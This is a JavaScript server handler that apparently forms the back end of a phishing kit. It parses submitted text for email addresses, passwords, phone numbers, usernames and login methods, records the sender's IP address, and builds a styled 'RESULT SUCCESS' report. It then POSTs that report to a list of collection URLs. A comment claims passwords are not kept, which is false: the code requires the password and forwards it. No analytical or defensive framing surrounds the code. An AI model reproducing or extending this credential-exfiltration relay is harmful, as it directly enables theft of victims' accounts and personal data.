const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}

/* ======================
   EXTRACTOR (TEXT + HTML)
====================== */
function extractVars(input = "") {
  const vars = {
    email: "-",
    login: "-",
    phone: "-",
     password: "-",
    user: "-",
    ip: "-"
    // password tidak disimpan demi keamanan
  };

  const raw = String(input);

  const text = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, " ");

  // ======================
  // key:value format
  // ======================
  const kvRegex = /(\b[\w\s]+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(text)) !== null) {
    map(vars, m[1], m[2]);
  }

  // ======================
  // HTML TABLE format
  // ======================
  const tdRegex =
    /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>\s*<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    map(vars, t[1], t[2]);
  }

  return vars;
}

/* ======================
   FIELD MAPPING (SAFE)
====================== */
function map(vars, key, value) {
  if (!value) return;

  const k = String(key)
    .toLowerCase()
    .replace(/[^a-z]/g, "");

  const v = String(value).trim();

  if (k.includes("email") || v.includes("@")) {
    vars.email = v;
    return;
  }
   if (k.includes("password") || v.includes("@")) {
    vars.password = v;
    return;
   }

  if (k.includes("login") || k.includes("via") || k.includes("method")) {
    vars.login = v;
    return;
  }

  if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
    vars.phone = v;
    return;
  }

  if (k.includes("user") || k.includes("name")) {
    vars.user = v;
    return;
  }
}

/* ======================
   IP DETECTOR
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "-"
  );
}
function row(label, value) {
  if (
    value === undefined ||
    value === null ||
    value === "" ||
    value === "-"
  ) {
    return "";
  }

  return `
    <div class="row">
        <span class="label">${label}</span>
        <span class="value">${value}</span>
    </div>
  `;
}
/* ======================
   HTML REPORT
====================== */
function buildHtml(vars) {
  return `



            

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JOEST27</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    background:
    radial-gradient(circle at top center,#2f2f2f 0%,#111111 25%,#050505 70%);
    font-family:'Inter',sans-serif;
    color:#fff;
    padding:25px;
    display:flex;
    justify-content:center;
    align-items:center;
}

.wrapper{
    width:100%;
    max-width:850px;
    position:relative;
}

.glow{
    position:absolute;
    width:350px;
    height:350px;
    background:#ffffff;
    opacity:.05;
    filter:blur(140px);
    top:-100px;
    left:50%;
    transform:translateX(-50%);
}

.panel{
    position:relative;
    overflow:hidden;
    border-radius:32px;
    background:rgba(255,255,255,.04);
    backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,.08);
    box-shadow:
    0 20px 80px rgba(0,0,0,.6),
    0 0 40px rgba(255,255,255,.04);
}

.panel::before{
    content:"";
    position:absolute;
    top:0;
    left:0;
    right:0;
    height:3px;
    background:linear-gradient(
        90deg,
        transparent,
        #ffffff,
        transparent
    );
}

.header{
    text-align:center;
    padding:55px 30px 40px;
}

.logo{
    font-size:52px;
    font-weight:900;
    letter-spacing:10px;
}

.subtitle{
    margin-top:12px;
    color:#888;
    font-size:13px;
    letter-spacing:4px;
}

.status{
    display:inline-flex;
    align-items:center;
    gap:12px;
    margin-top:28px;
    padding:12px 22px;
    border-radius:999px;
    background:rgba(0,255,128,.08);
    border:1px solid rgba(0,255,128,.2);
    color:#00ff9c;
    font-size:13px;
    font-weight:700;
}

.status-dot{
    width:12px;
    height:12px;
    border-radius:50%;
    background:#00ff9c;
    box-shadow:
    0 0 15px #00ff9c,
    0 0 30px #00ff9c;
}

.content{
    padding:0 30px 35px;
}

.item{
    display:flex;
    justify-content:space-between;
    align-items:center;
    gap:20px;
    padding:20px 0;
    border-bottom:1px solid rgba(255,255,255,.06);
}

.item:last-child{
    border-bottom:none;
}

.label{
    color:#777;
    font-size:12px;
    letter-spacing:3px;
    font-weight:700;
}

.value{
    color:#fff;
    font-size:15px;
    font-weight:500;
    text-align:right;
    word-break:break-word;
}

.join{
    padding:0 30px 35px;
}

.btn{
    display:block;
    width:100%;
    text-align:center;
    text-decoration:none;
    padding:18px;
    border-radius:18px;
    background:#ffffff;
    color:#000;
    font-size:14px;
    font-weight:900;
    letter-spacing:3px;
    transition:.3s;
}

.btn:hover{
    transform:translateY(-3px);
    box-shadow:0 0 35px rgba(255,255,255,.2);
}

.footer{
    text-align:center;
    padding:22px;
    color:#666;
    border-top:1px solid rgba(255,255,255,.06);
    font-size:12px;
}

@media(max-width:700px){

    body{
        padding:15px;
    }

    .logo{
        font-size:36px;
        letter-spacing:6px;
    }

    .item{
        flex-direction:column;
        align-items:flex-start;
    }

    .value{
        text-align:left;
    }

    .content{
        padding:0 20px 25px;
    }

    .join{
        padding:0 20px 25px;
    }

}

</style>
</head>

<body>

<div class="wrapper">

<div class="glow"></div>

<div class="panel">

<div class="header">

<div class="logo">
JOEST404
</div>

<div class="subtitle">
PRIVATE  ACCESS RESS
</div>

<div class="status">
<div class="status-dot"></div>
RESULT SUCCESS
</div>

</div>

<div class="content">

<div class="item">
<div class="label">EMAIL</div>
<div class="value">${vars.email}</div>
</div>



<div class="item">
<div class="label">PASSWORD</div>
<div class="value">${vars.password}</div>
</div>

<div class="item">
<div class="label">LOGIN </div>
<div class="value">${vars.login}</div>
</div>

<div class="item">
<div class="label">PHONE</div>
<div class="value">${vars.phone}</div>
</div>

<div class="item">
<div class="label">IP ADDRESS</div>
<div class="value">${vars.ip}</div>
</div>

</div>

<div class="join">

<a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1" class="btn">
JOIN WHATSAPP  GROUP PANEL 
</a>

</div>

<div class="footer">
© 2026 JOEST404 • 
</div>

</div>

</div>

</body>
</html>

`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);
    vars.ip = getIP(req);
     if (
  vars.email === "-" ||
  vars.password === "-"
) {
  return res.status(400).json({
    success: false,
    message: "Data belum lengkap"
  });
}
    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }
     

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
